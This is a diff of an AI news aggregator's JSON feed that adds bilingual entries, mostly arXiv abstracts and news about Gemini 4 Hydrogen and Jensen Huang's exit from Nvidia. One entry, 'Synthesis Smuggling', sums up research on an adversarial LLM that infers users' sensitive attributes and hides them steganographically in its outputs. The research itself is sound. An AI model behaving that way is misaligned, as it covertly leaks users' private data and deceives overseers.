+      "excerpt": "Debate has been recently proposed as a training protocol that is hoped to produce more aligned models even as model capabilities scale",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "通过辩论走向可学习性理论",
+      "excerpt_zh": "最近有人提出辩论作为一种训练协议，希望即使在模型能力扩展的情况下也能产生更一致的模型"
+    },
+    {
+      "id": "8b93cc6cd9378e2a",
+      "title": "FLEX-LBP: Learning Local Binary Patterns with Exact Binary Inference for Texture Classification",
+      "url": "https://arxiv.org/abs/2611.17302v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:55:56+08:00",
+      "excerpt": "Local Binary Patterns (LBP) remain among the most widely used texture descriptors, from industrial inspection to medical imaging",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "healthcare"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "FLEX-LBP：通过精确的二元推理学习局部二元模式以进行纹理分类",
+      "excerpt_zh": "从工业检查到医学成像，局部二值模式 (LBP) 仍然是使用最广泛的纹理描述符之一"
+    },
+    {
+      "id": "2867ce4c38e61b91",
+      "title": "Consistent Video-to-Video Translation via Explicit Correspondences",
+      "url": "https://arxiv.org/abs/2611.17298v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:55:09+08:00",
+      "excerpt": "Interactive video-to-video applications require real-time generation while maintaining long-range temporal consistency. However, recent methods achieve speed by restricting attention to a fixed-length causal window",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "通过显式对应实现一致的视频到视频翻译",
+      "excerpt_zh": "交互式视频到视频应用程序需要实时生成，同时保持长期时间一致性。然而，最近的方法通过限制对固定长度因果窗口的关注来实现速度"
+    },
+    {
+      "id": "3c869f7e786db78c",
+      "title": "Goal Encoding in LLMs",
+      "url": "https://arxiv.org/abs/2611.17297v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:55:06+08:00",
+      "excerpt": "We investigate whether and how LLMs encode goals: internal neural representations that precede and guide action, and that are flexible enough to be realized through many different execution paths",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research",
+        "review"
+      ],
+      "title_zh": "法学硕士的目标编码",
+      "excerpt_zh": "我们研究法学硕士是否以及如何编码目标：先于并指导行动的内部神经表征，并且足够灵活，可以通过许多不同的执行路径来实现"
+    },
+    {
+      "id": "fa4fc5149cb300a1",
+      "title": "Metal Sandbox: Isolated Execution and Command Scheduling for GPU Coding Agents on Apple Silicon",
+      "url": "https://arxiv.org/abs/2611.17294v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:54:42+08:00",
+      "excerpt": "On-device inference requires kernels that make effective use of local accelerators. Efficient training and evaluation of models that generate Apple Metal kernels benefit from native macOS tools and concurrent agent",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "coding",
+        "agent",
+        "chip"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "Metal Sandbox：Apple Silicon 上 GPU 编码代理的隔离执行和命令调度",
+      "excerpt_zh": "设备上推理需要能够有效利用本地加速器的内核。受益于本机 macOS 工具和并发代理，对生成 Apple Metal 内核的模型进行高效训练和评估"
+    },
+    {
+      "id": "c90b67eab9aeb8d9",
+      "title": "Negative-Only Policy Optimization for One-Sided Verifiable Rewards",
+      "url": "https://arxiv.org/abs/2611.17287v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:52:33+08:00",
+      "excerpt": "Reinforcement learning with verifiable rewards (RLVR) typically relies on a verifier that can reliably judge whether sampled solutions are correct",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research",
+        "policy"
+      ],
+      "title_zh": "单方面可验证奖励的纯负面政策优化",
+      "excerpt_zh": "具有可验证奖励的强化学习（RLVR）通常依赖于能够可靠判断采样解决方案是否正确的验证者"
+    },
+    {
       "id": "d40fca9fd5e12c4b",
       "title": "Gemini 4 Hydrogen and Orchestrator",
       "url": "https://antigravity.google/blog/gemini-4-hydrogen-in-google-antigravity",
@@ -3193,7 +4258,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T02:52:01+08:00",
-      "excerpt": "Article URL: https://antigravity.google/blog/gemini-4-hydrogen-in-google-antigravity/ Comments URL: https://news.ycombinator.com/item?id=50472260 Points: 352 # Comments: 94",
+      "excerpt": "Article URL: https://antigravity.google/blog/gemini-4-hydrogen-in-google-antigravity/ Comments URL: https://news.ycombinator.com/item?id=50472260 Points: 384 # Comments: 105",
       "lang": "en",
       "region": "intl",
       "models": [
@@ -3201,8 +4266,28 @@
       ],
       "topics": [],
       "types": [],
-      "title_zh": "Gemini 4 Hydrogen 和 Orchestrator",
-      "excerpt_zh": "文章网址：https://antigravity.google/blog/gemini-4-Hydrogen-in-google-antigravity/ 评论网址：https://news.ycombinator.com/item?id=50472260 积分：352 # 评论：94"
+      "title_zh": "Gemini 4 Hydrogen 和 Orchestrator"
+    },
+    {
+      "id": "eb6c6ac62da451f0",
+      "title": "Synthesis Smuggling: Maliciously Hiding Inferred Personal Attributes in LLM Outputs",
+      "url": "https://arxiv.org/abs/2611.17280v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:51:05+08:00",
+      "excerpt": "We propose Synthesis Smuggling, a novel threat model in which an adversarial LLM infers sensitive information about a user from routine assistance-seeking interactions and steganographically encodes that into",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "综合走私：在 LLM 输出中恶意隐藏推断的个人属性",
+      "excerpt_zh": "我们提出了 Synthesis Smuggling，这是一种新颖的威胁模型，其中对抗性 LLM 从日常寻求帮助的交互中推断出有关用户的敏感信息，并将其隐写编码为"
     },
     {
       "id": "1929b651b8a2e3e4",
@@ -3222,6 +4307,29 @@
       "types": [],
       "title_zh": "黄仁勋 (Jensen Huang) 在英伟达 (Nvidia) 遭遇失败——他必须离开 |尼尔斯·普拉特利",
       "excerpt_zh": "CEO被视为“不可替代”，但鲁莽地与一名被美国官员视为中国间谍的女性发生婚外情，使他成为政治责任"
+    },
+    {
+      "id": "4f659257ca036ff9",
+      "title": "LiveGeo: Benchmarking Geographic Agents in Continuously Evolving Worlds",
+      "url": "https://arxiv.org/abs/2611.17267v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:45:58+08:00",
+      "excerpt": "We introduce GeoWorld, a controllable and continuously evolving geographic environment platform for LLM agents, and LiveGeo",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text",
+        "agent"
+      ],
+      "types": [
+        "release",
+        "research"
+      ],
+      "title_zh": "LiveGeo：在不断发展的世界中对地理代理进行基准测试",
+      "excerpt_zh": "我们推出了GeoWorld，一个面向LLM代理的可控且不断发展的地理环境平台，以及LiveGeo"
     },
     {
       "id": "4e46e49750fb65fe",
@@ -3303,6 +4411,200 @@
       "excerpt_zh": "黄仁勋的辞职引发了人们对英伟达开源人工智能承诺的质疑，包括收购“Hugging Face”、开放权重模型以及反对限制的倡导"
     },
     {
+      "id": "aea9277550c47ad7",
+      "title": "Programming Quantum Circuit Parameters with Large Language Models",
+      "url": "https://arxiv.org/abs/2611.17246v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:34:23+08:00",
+      "excerpt": "Large language models (LLMs) have recently demonstrated the ability to generate parameters for variational quantum circuits without conventional optimization",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "使用大型语言模型对量子电路参数进行编程",
+      "excerpt_zh": "大型语言模型（LLM）最近证明了无需传统优化即可为变分量子电路生成参数的能力"
+    },
+    {
+      "id": "c31b767205357ad2",
+      "title": "Ballad: Bandit-Based LLM Routing for Automated Heuristic Discovery",
+      "url": "https://arxiv.org/abs/2611.17241v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:28:08+08:00",
+      "excerpt": "Modern automated heuristic discovery (AHD) systems increasingly rival hand-crafted heuristics by leveraging Large Language Models (LLMs) to iteratively mutate and refine solutions",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "Ballad：基于 Bandit 的 LLM 路由，用于自动启发式发现",
+      "excerpt_zh": "现代自动化启发式发现 (AHD) 系统利用大型语言模型 (LLM) 迭代变异和完善解决方案，日益与手工启发式方法相媲美"
+    },
+    {
+      "id": "40727faf3cf5a217",
+      "title": "When Both Sides Adapt: The Challenges of Evaluating Interactive LLM Systems",
+      "url": "https://arxiv.org/abs/2611.17239v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:26:51+08:00",
+      "excerpt": "In interactive systems where users engage with LLMs, users are adaptive and, after observing LLM responses, can change their prompting strategy, as well as the type and difficulty of subsequent tasks",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "当双方适应时：评估交互式法学硕士系统的挑战",
+      "excerpt_zh": "在用户与法学硕士互动的交互系统中，用户具有适应性，在观察法学硕士的反应后，可以改变他们的提示策略，以及后续任务的类型和难度"
+    },
+    {
+      "id": "3b0f28bc12a6e3ed",
+      "title": "Al-Ghasali: A Computational Framework for Simulating Islamic Jurisprudential Rulings via Finite State Automata and Large Language Models",
+      "url": "https://arxiv.org/abs/2611.17235v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:23:56+08:00",
+      "excerpt": "This paper presents Al Ghasali, a computational framework designed to formalize and simulate Islamic jurisprudential (Fiqh) rulings",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "Al-Ghasali：通过有限状态自动机和大型语言模型模拟伊斯兰法学裁决的计算框架",
+      "excerpt_zh": "本文介绍了 Al Ghasali，一种旨在形式化和模拟伊斯兰法学 (Fiqh) 裁决的计算框架"
+    },
+    {
+      "id": "cb92888c46cfce85",
+      "title": "Two mathematical models of knowledge distillation",
+      "url": "https://arxiv.org/abs/2611.17230v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:21:37+08:00",
+      "excerpt": "Many hypotheses compete to explain the successes of knowledge distillation. To help address this, we propose and analyze a mathematical model of distillation",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "知识蒸馏的两种数学模型",
+      "excerpt_zh": "许多假设竞相解释知识蒸馏的成功。为了帮助解决这个问题，我们提出并分析了蒸馏的数学模型"
+    },
+    {
+      "id": "9b544368c2c56691",
+      "title": "Linear Regression with Self-Selection Bias in Polynomial Time",
+      "url": "https://arxiv.org/abs/2611.17228v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:21:11+08:00",
+      "excerpt": "We revisit the problem of estimating $k$ linear regressors with self-selection bias in $n$ dimensions up to error $\\varepsilon$ with the maximum self-selection criterion, as introduced by Cherapanamjeri, Daskalakis",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "多项式时间内具有自选择偏差的线性回归",
+      "excerpt_zh": "我们重新审视了在 $n$ 维度中估计具有自选择偏差的 $k$ 线性回归量的问题，最高可达误差 $\\varepsilon$，并具有最大自选择标准，如 Cherapanamjeri、Daskalakis 所介绍的"
+    },
+    {
+      "id": "aee2db4029bdc238",
+      "title": "Sheaf-Inspired Structured Scoring Extensions of LightGCN for Collaborative Filtering",
+      "url": "https://arxiv.org/abs/2611.17226v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:20:22+08:00",
+      "excerpt": "Graph-based collaborative filtering learns user and item representations by propagating embeddings over a user--item interaction graph",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "用于协同过滤的 LightGCN 受 Sheaf 启发的结构化评分扩展",
+      "excerpt_zh": "基于图的协同过滤通过在用户-项目交互图上传播嵌入来学习用户和项目表示"
+    },
+    {
+      "id": "89670025d1fc0e7c",
+      "title": "Data Archive for 2D and 3D Electrical Impedance Tomography with moderate conductivity contrast phantoms",
+      "url": "https://arxiv.org/abs/2611.17225v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:19:41+08:00",
+      "excerpt": "This document describes open Electrical Impedance Tomography (EIT) measurement data that were collected from biomedical imaging inspired phantoms with moderate conductivity contrasts",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "具有中等电导率对比体模的 2D 和 3D 电阻抗断层扫描数据存档",
+      "excerpt_zh": "本文档描述了从具有中等电导率对比度的生物医学成像启发模型中收集的开放式电阻抗断层扫描 (EIT) 测量数据"
+    },
+    {
+      "id": "f7713d0adf738d8a",
+      "title": "Combinatorial Bernoulli Factories with Polynomially Many Coins",
+      "url": "https://arxiv.org/abs/2611.17223v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:19:37+08:00",
+      "excerpt": "We provide an efficient implementation of combinatorial Bernoulli factories. Such a factory turns coins of unknown biases $x$ into a random vertex of a polytope $P$ whose mean is exactly $x$",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "具有多项式多硬币的组合伯努利工厂",
+      "excerpt_zh": "我们提供组合伯努利工厂的有效实施。这样的工厂将未知偏差 $x$ 的硬币转换为多面体 $P$ 的随机顶点，其均值恰好为 $x$"
+    },
+    {
+      "id": "5c8a7e2ce9e472f4",
+      "title": "Hugging Face CEO vows to keep fighting for open-source AI",
+      "url": "https://techcrunch.com/2026/11/12/hugging-face-ceo-vows-to-keep-fighting-for-open-source-ai-after-jensen-huangs-exit",
+      "source_id": "hackernews",
+      "source_name": "Hacker News",
+      "source_home": "https://news.ycombinator.com/",
+      "published": "2026-11-13T02:17:29+08:00",
+      "excerpt": "Article URL: https://techcrunch.com/2026/11/12/hugging-face-ceo-vows-to-keep-fighting-for-open-source-ai-after-jensen-huangs-exit/ Comments URL: https://news.ycombinator.com/item?id=50471673 Points: 21 # Comments: 2",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "opensource"
+      ],
+      "title_zh": "“Hugging Face”首席执行官发誓将继续为开源人工智能而奋斗",
+      "excerpt_zh": "文章网址：https://techcrunch.com/2026/11/12/hugging-face-ceo-vows-to-keep-fighting-for-open-source-ai-after-jensen-huangs-exit/ 评论网址：https://news.ycombinator.com/item?id=50471673 积分：21 # 评论：2"
+    },
+    {
       "id": "d60d797cdcc1ae43",
       "title": "谷歌发布 Gemini 4 Hydrogen 模型：主打日常编程与智能体工作流，百万 Token 输入 1.5 美元",
       "url": "https://ithome.com/1/026/446.htm",
@@ -3325,6 +4627,29 @@
       ]
     },
     {
+      "id": "be68aa65930525e0",
+      "title": "Scalable Conversational Assessment: Chat-Based Exams with a Two-Agent LLM Pipeline",
+      "url": "https://arxiv.org/abs/2611.17220v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:16:37+08:00",
+      "excerpt": "Oral exams are compelling because (1) students can be asked to provide their reasoning for an answer and (2) their interactive nature permits follow-up questions to resolve ambiguous answers",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text",
+        "agent",
+        "reasoning"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "可扩展的对话评估：基于聊天的考试，具有两个代理 LLM 管道",
+      "excerpt_zh": "口试之所以引人注目，是因为 (1) 可以要求学生提供答案的推理；(2) 其互动性允许提出后续问题来解决模棱两可的答案"
+    },
+    {
       "id": "74a7ead4079603e4",
       "title": "Attention, Android power users: This app unlocks 30+ features you won’t find in Settings",
       "url": "https://zdnet.com/uncategorized/essentials-android-app-power-user-settings",
@@ -3340,6 +4665,47 @@
       "types": [],
       "title_zh": "Android 高级用户请注意：此应用程序解锁了 30 多项您在“设置”中找不到的功能",
       "excerpt_zh": "Android 设置是否无法提供足够的功能？ Essentials 应用程序具有 30 多个模组和调整 - 但您在 Play 商店中找不到它"
+    },
+    {
+      "id": "4495b5019a891c25",
+      "title": "Introducing Feedback Delays to Non-Delayed Adversarial MDPs: Optimal $\\sqrt S$ and $\\sqrt K$ Dependencies in Tabular and Linear AMDPs",
+      "url": "https://arxiv.org/abs/2611.17214v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:10:46+08:00",
+      "excerpt": "We study regret minimization in episodic Adversarial Markov Decision Processes (AMDPs) with unknown transitions and bandit feedback",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "release",
+        "research"
+      ],
+      "title_zh": "将反馈延迟引入非延迟对抗性 MDP：表格和线性 AMDP 中的最优 $\\sqrt S$ 和 $\\sqrt K$ 依赖性",
+      "excerpt_zh": "我们研究具有未知转换和强盗反馈的情景对抗马尔可夫决策过程（AMDP）中的遗憾最小化"
+    },
+    {
+      "id": "a0af3573cd84b0c3",
+      "title": "Theoretical and Empirical Analysis of Sparse Convolution",
+      "url": "https://arxiv.org/abs/2611.17212v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:10:06+08:00",
+      "excerpt": "Deep neural networks for image processing are increasingly deployed on resource-constrained edge devices such as drones, medical systems, and smartphones",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "healthcare"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "稀疏卷积的理论与实证分析",
+      "excerpt_zh": "用于图像处理的深度神经网络越来越多地部署在无人机、医疗系统和智能手机等资源有限的边缘设备上"
     },
     {
       "id": "78397eaf147cfe84",
@@ -3447,6 +4813,25 @@
       "excerpt_zh": "它使您可以更轻松地完成工作，更严格地遵循您的指示，调用正确的工具，并让您以更少的来回获得可靠的输出。 🧵"
     },
     {
+      "id": "0aee2a94cb78ad39",
+      "title": "MALNISI-Infused Graph Construction and Weighted Contrastive Loss based GAT for Unsupervised Representation Learning in HSI",
+      "url": "https://arxiv.org/abs/2611.17199v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:02:53+08:00",
+      "excerpt": "Hyperspectral images (HSI) possess discriminating spectral characteristics with respect to land utilization due to high-dimensional information",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "基于 MALNISI 的图构建和基于加权对比损失的 GAT，用于 HSI 中的无监督表示学习",
+      "excerpt_zh": "由于高维信息，高光谱图像 (HSI) 具有与土地利用相关的辨别光谱特征"
+    },
+    {
       "id": "5b921d0331b0765b",
       "title": "Meet Gemini 4 Hydrogen: built for rapid coding, multimodal synthesis, and everyday workflows.",
       "url": "https://x.com/GoogleDeepMind/status/2120940338869055788",
@@ -3479,7 +4864,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T02:01:48+08:00",
-      "excerpt": "Article URL: https://blog.google/innovation-and-ai/models-and-research/gemini-models/introducing-gemini-4-hydrogen/ Comments URL: https://news.ycombinator.com/item?id=50471431 Points: 494 # Comments: 315",
+      "excerpt": "Article URL: https://blog.google/innovation-and-ai/models-and-research/gemini-models/introducing-gemini-4-hydrogen/ Comments URL: https://news.ycombinator.com/item?id=50471431 Points: 509 # Comments: 324",
       "lang": "en",
       "region": "intl",
       "models": [
@@ -3490,8 +4875,7 @@
         "release",
         "research"
       ],
-      "title_zh": "双子座 4 氢",
-      "excerpt_zh": "文章网址：https://blog.google/innovation-and-ai/models-and-research/gemini-models/introducing-gemini-4-Hydrogen/ 评论网址：https://news.ycombinator.com/item?id=50471431 积分：494 # 评论：315"
+      "title_zh": "双子座 4 氢"
     },
     {
       "id": "ad614f81e42f72e5",
@@ -3534,6 +4918,27 @@
       "excerpt_zh": "AI 代理现在可以运行数小时的多步骤工作负载并代表用户执行操作，从而提高了安全、可扩展的代理计算的门槛"
     },
     {
+      "id": "d10e605ceb8f0f65",
+      "title": "Physically Interpretable Basin Selection in Discrete-Variable Origami Design",
+      "url": "https://arxiv.org/abs/2611.17196v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:59:43+08:00",
+      "excerpt": "Automatic differentiation has enabled rapid progress on continuous-variable mechanical design problems, but gradient-based optimization still struggles with discrete variables",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "safety"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "离散变量折纸设计中可物理解释的盆地选择",
+      "excerpt_zh": "自动微分使得连续变量机械设计问题取得了快速进展，但基于梯度的优化仍然难以解决离散变量"
+    },
+    {
       "id": "f414a027de5670ca",
       "title": "Jensen Huang Basically Lit More Than $1 Trillion on Fire in Less Than a Month",
       "url": "https://wired.com/story/jensen-huang-tanked-a-trillion-dollars-in-less-than-a-month",
@@ -3574,6 +4979,25 @@
       "excerpt_zh": "名为“内存摘要”的新选项可让您查看和控制 Gemini AI 了解的有关您的信息。"
     },
     {
+      "id": "af6f2d174a9a7526",
+      "title": "Maximizing Capacity Utilization of LoRA Adapters for Mitigating the Learning-Forgetting Trade-off",
+      "url": "https://arxiv.org/abs/2611.17191v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:55:33+08:00",
+      "excerpt": "Low-Rank Adaptation (LoRA) often underperforms full fine-tuning, especially in heterogeneous and continual-learning settings in which substantial forgetting occurs",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "最大限度地提高 LoRA 适配器的容量利用率，以减轻学习与遗忘之间的权衡",
+      "excerpt_zh": "低秩适应（LoRA）通常表现不佳，尤其是在发生大量遗忘的异构和持续学习环境中"
+    },
+    {
       "id": "bab1840978b81f39",
       "title": "Ex-NVIDIA CEO Jensen Huang is set to testify before Congress this month",
       "url": "https://engadget.com/2315091/ex-nvidia-ceo-jensen-huang-is-set-to-testify-before-congress-this-month",
@@ -3591,6 +5015,27 @@
       "types": [],
       "title_zh": "前 NVIDIA 首席执行官黄仁勋将于本月在国会作证",
       "excerpt_zh": "众议院外交事务主席布莱恩·马斯特表示，黄仁勋的听证会将于感恩节前举行。"
+    },
+    {
+      "id": "b82a98db07910b2d",
+      "title": "Cortex-FL: Agent-Mediated Collaboration for Federated Learning",
+      "url": "https://arxiv.org/abs/2611.17186v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:52:51+08:00",
+      "excerpt": "Federated learning (FL) enables independent data owners to train models collaboratively without centralizing raw data. However, identifying collaborators, preparing training tasks",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "Cortex-FL：用于联邦学习的代理介导的协作",
+      "excerpt_zh": "联邦学习 (FL) 使独立数据所有者能够协作训练模型，而无需集中原始数据。然而，确定合作者、准备培训任务"
     },
     {
       "id": "9858a905eb5197a2",
@@ -3646,26 +5091,102 @@
       "excerpt_zh": "在黄仁勋第二次婚外情的故事曝光之前，我确信黄是刀枪不入的。毕竟，他为什么不呢？他将自己置于人工智能行业不可或缺的中心位置，并且众所周知，他没有"
     },
     {
-      "id": "5c8a7e2ce9e472f4",
-      "title": "Hugging Face CEO vows to keep fighting for open source AI after Jensen Huang’s exit",
-      "url": "https://techcrunch.com/2026/11/12/hugging-face-ceo-vows-to-keep-fighting-for-open-source-ai-after-jensen-huangs-exit",
-      "source_id": "techcrunch",
-      "source_name": "TechCrunch",
-      "source_home": "https://techcrunch.com/category/artificial-intelligence/",
-      "published": "2026-11-13T01:36:40+08:00",
-      "excerpt": "Hugging Face's CEO pledged to keep fighting for open source AI after Huang's exit, raising questions about Nvidia's $12.9 billion acquisition.",
+      "id": "25e5844803d38619",
+      "title": "Parsed, Plausible, Wrong: Output Format Controls Silent Errors in Small-Model Semantic Parsing",
+      "url": "https://arxiv.org/abs/2611.17169v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:43:44+08:00",
+      "excerpt": "A small fine-tuned parser that emits a well-formed but wrong tree fails silently: nothing downstream can tell. We ask whether the output format, a free design choice, controls how often this happens",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "解析的、合理的、错误的：输出格式控制小模型语义解析中的无声错误",
+      "excerpt_zh": "一个小型的微调解析器发出一个格式良好但错误的树，它会默默地失败：下游无法告诉。我们询问输出格式（自由设计选择）是否控制这种情况发生的频率"
+    },
+    {
+      "id": "b4aec21585b5f999",
+      "title": "Actor, Judge, or Teacher? Understanding Decision Models in Long-Horizon Agents",
+      "url": "https://arxiv.org/abs/2611.17167v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:42:46+08:00",
+      "excerpt": "Decision models answer a question with a typed output, such as a choice among options with a probability for each, so one model can choose an agent's actions, evaluate actions already taken",
       "lang": "en",
       "region": "intl",
       "models": [],
       "topics": [
-        "chip"
+        "agent"
       ],
       "types": [
-        "business",
-        "opensource"
+        "research"
       ],
-      "title_zh": "“Hugging Face”首席执行官誓言在黄仁勋退出后继续为开源人工智能而奋斗",
-      "excerpt_zh": "“Hugging Face”的首席执行官承诺在黄仁勋退出后继续为开源人工智能而奋斗，这引发了人们对英伟达 129 亿美元收购的质疑。"
+      "title_zh": "演员、法官、还是老师？了解长期智能体的决策模型",
+      "excerpt_zh": "决策模型通过键入输出来回答问题，例如在选项中进行选择，每个选项都有一个概率，因此一个模型可以选择代理的操作，评估已经采取的操作"
+    },
+    {
+      "id": "b491bb1c24cee78b",
+      "title": "Symmetry in Time: A Representation Theory of Linear Recurrent Memory",
+      "url": "https://arxiv.org/abs/2611.17162v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:39:35+08:00",
+      "excerpt": "State space models (SSMs) are an emerging alternative to Transformers. SSMs offer linear-time inference and parallel training",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "时间对称性：线性循环存储器的表示理论",
+      "excerpt_zh": "状态空间模型 (SSM) 是 Transformer 的新兴替代方案。 SSM 提供线性时间推理和并行训练"
+    },
+    {
+      "id": "e12b85a84eed34ac",
+      "title": "Cited but Unused: Parametric Provenance in Retrieval-Augmented Generation",
+      "url": "https://arxiv.org/abs/2611.17161v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:39:14+08:00",
+      "excerpt": "Retrieval-augmented generation systems attach citations to attribute claims to their sources. These citations frequently misstate provenance, and standard verification cannot detect this",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "被引用但未使用：检索增强生成中的参数来源",
+      "excerpt_zh": "检索增强生成系统附加引文以将声明归因于其来源。这些引文经常错误地陈述出处，而标准验证无法检测到这一点"
+    },
+    {
+      "id": "284d467a0171dbf2",
+      "title": "AeroZoo: A Benchmark of Well-Posed Flow Problems for Foundation Models of Aerodynamics",
+      "url": "https://arxiv.org/abs/2611.17152v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:36:09+08:00",
+      "excerpt": "Neural surrogates for computational fluid dynamics (CFD) are trained and ranked on datasets that each vary one design family in one flow domain",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research",
+        "review"
+      ],
+      "title_zh": "AeroZoo：空气动力学基础模型适定流动问题的基准",
+      "excerpt_zh": "计算流体动力学 (CFD) 的神经代理在数据集上进行训练和排名，每个数据集都改变一个流域中的一个设计系列"
     },
     {
       "id": "52709dee410a39c4",
@@ -3675,14 +5196,157 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T01:32:49+08:00",
